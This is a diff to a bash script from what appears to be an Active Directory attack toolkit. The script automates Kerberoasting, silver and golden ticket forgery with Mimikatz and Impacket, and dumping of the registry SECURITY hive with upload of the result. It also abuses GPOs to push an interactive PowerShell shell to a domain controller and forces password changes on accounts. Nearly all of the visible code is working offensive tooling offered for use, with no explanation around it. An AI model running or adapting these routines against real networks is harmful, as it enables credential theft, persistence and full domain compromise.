@@ -4,6 +4,8 @@ source "$SCRIPTDIR/password_cracking.sh"
 source "$SCRIPTDIR/impacket.sh"
 source "$SCRIPTDIR/mimikatz.sh"
 source "$SCRIPTDIR/hashcat.sh"
+source "$SCRIPTDIR/kerbrute.sh"
+source "$SCRIPTDIR/ldap.sh"
 
 download_spray_passwords() {
     if [[ ! -f "Spray-Passwords.ps1" ]]; then
@@ -11,14 +13,6 @@ download_spray_passwords() {
     fi
     generate_windows_download Spray-Passwords.ps1
 
-}
-
-download_kerbrute() {
-    local kerbrute_url="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe"
-    if [[ ! -f "kerbrute_windows_amd64.exe" ]]; then
-        wget "$kerbrute_url" -O kerbrute_windows_amd64.exe >> $trail_log
-    fi
-    generate_windows_download kerbrute_windows_amd64.exe
 }
 
 download_crackmapexec_windows() {
@@ -50,7 +44,7 @@ perform_kerberoast_rubeus() {
     upload_file $hash_file
 }
 
-get_silverticket_command() {
+perform_silverticket_windows() {
     if [[ -z "$username" ]] || [[ -z "$domain" ]] || [[ -z "$target_hostname" ]]; then
         echo "Username, domain, and target IP/host address must be set before running SilverTicket command."
         return 1
@@ -74,6 +68,11 @@ get_silverticket_command() {
 
 }
 
+perform_impacket_silverticket() {
+    output=$(run_impacket_lookupsid)
+    domain_sid=$(echo "$output" | grep -oP 'Domain SID is: \K[^:]+')
+
+}
 
 get_wmic_command() {
     if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
@@ -132,7 +131,7 @@ get_powershell_remoting_command() {
     powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
     powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
     powershell_commands+='New-PSSession -ComputerName '$target_ip' -Credential $credential;'
-    powershell_commands+='Enter-PSSession 1'
+    #powershell_commands+='Enter-PSSession 1'
     echo "$powershell_commands"
 }
 
@@ -183,7 +182,7 @@ get_dcom_command() {
     echo "$powershell_command"   
 }
 
-get_golden_ticket_mimikatz() {
+perform_golden_ticket_windows() {
     target_username=krbtgt
     if ! get_ntlm_hash_from_mimikatz_log_lsadump; then
         echo "Failed to extract NTLM hash for $target_username."
@@ -201,6 +200,10 @@ get_golden_ticket_mimikatz() {
     get_psexec
     echo '.\mimikatz.exe "kerberos::purge" exit'
     echo '.\mimikatz.exe "kerberos::golden /user:'$username' /domain:'$domain' /sid:'$domain_sid' /'$target_username':'$ntlm_hash' /ptt" exit'
+}
+
+perform_golden_ticket_linux() {
+    run_impacket_golden_ticket
 }
 
 get_perform_gpo_changeowner_windows_command() {
@@ -237,8 +240,7 @@ perform_gpo_abuse_linux() {
     if [[ -z "$cmd" ]]; then
         echo "Command file already exists, skipping command generation."
     else
-        echo $COMMONDIR/start_listener.sh $project $host_port interactive
-        cmd=$(get_powershell_interactive_shell $host_port)
+        cmd=$(get_powershell_interactive_shell)
     fi
     pushd pyGPOAbuse || exit 1
     python3 pygpoabuse.py $domain/$gpo_owner_username:$gpo_owner_password -gpo-id $gpo_id -command "$cmd" -dc-ip $dc_ip -f
@@ -377,7 +379,7 @@ run_evil_winrm() {
 
 }   
 
-target_kerberoast() {
+perform_target_kerberoast() {
     echo "Running Kerberoasting..."
     local url="https://github.com/ShutdownRepo/targetedKerberoast/archive/refs/heads/main.zip"
     local targetedKerberoast_dir="targetedKerberoast"
@@ -388,7 +390,7 @@ target_kerberoast() {
         mv targetedKerberoast-main "$targetedKerberoast_dir"
         rm "$targetedKerberoast_dir.zip"
     fi
-    if [[ -z "$target_user" ]]; then
+    if [[ -z "$target_username" ]]; then
         echo "Target user is not set. Please set it before running"
         return 1
     fi
@@ -401,7 +403,10 @@ target_kerberoast() {
         return 1
     fi
     if [[ -z $hash_file ]]; then
-        hash_file="hashes.$target_user"
+        hash_file="hashes.$target_username"
+    elif [[ -f $hash_file ]]; then
+        echo "Hash file $hash_file already exists, skipping targetedKerberoast execution."
+        return 0
     fi
     pushd "$targetedKerberoast_dir" || exit 1
     python3 targetedKerberoast.py -v -d "$domain" -u "$username" -p "$password" --dc-ip "$dc_ip" -o "$hash_file"
@@ -435,7 +440,6 @@ get_regsave_commands() {
     fi
     echo "reg save hklm\security $target_security"
     upload_file "$target_security"
- 
 }
 
 get_ntdsutil_commands() {
@@ -498,11 +502,12 @@ change_password_samba() {
         return 1
     fi
 
-    local samba_command="net rpc password '$target_username' '$target_password' -U '$domain\\$username%$password' -S '$dc_host'"
+    local samba_command="net rpc password -d 0 '$target_username' '$target_password' -U '$domain'/'$username'%'$password' -S '$dc_host'"
     echo "$samba_command"
     eval "$samba_command" | tee -a $log_dir/samba_password_change.log
 
 }
+
 
 perform_shadow_credentials_exe() {
     echo "Performing shadow credentials..."
